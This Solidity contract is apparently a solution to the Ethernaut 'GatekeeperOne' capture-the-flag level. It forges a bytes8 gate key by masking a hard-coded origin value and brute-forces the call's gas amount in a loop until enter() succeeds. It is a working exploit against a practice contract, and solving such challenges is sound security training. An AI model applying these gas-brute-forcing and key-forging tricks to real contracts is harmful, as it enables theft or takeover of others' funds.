pragma solidity ^0.8.0;

import "/GateKeeper1.sol";

contract AreYouTheKeyMaster{
    bytes8 txOrigin16 =0xb61213C3E61F2C4d;
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;
    GatekeeperOne public gkpOne;

    function setGatekeepOne(address _addr) public {
        gkpOne = GatekeeperOne(_addr);
    }

    function letMeIn() public{
        for(uint256 i =0; i < 120; i++){
        (bool result, bytes memory data) = address(gkpOne).call{gas: i + 150 +8191*3}(abi.encodeWithSignature("enter(bytes8)", key));
        if(result){
            {
                break;
            }
        }
        }
    }
}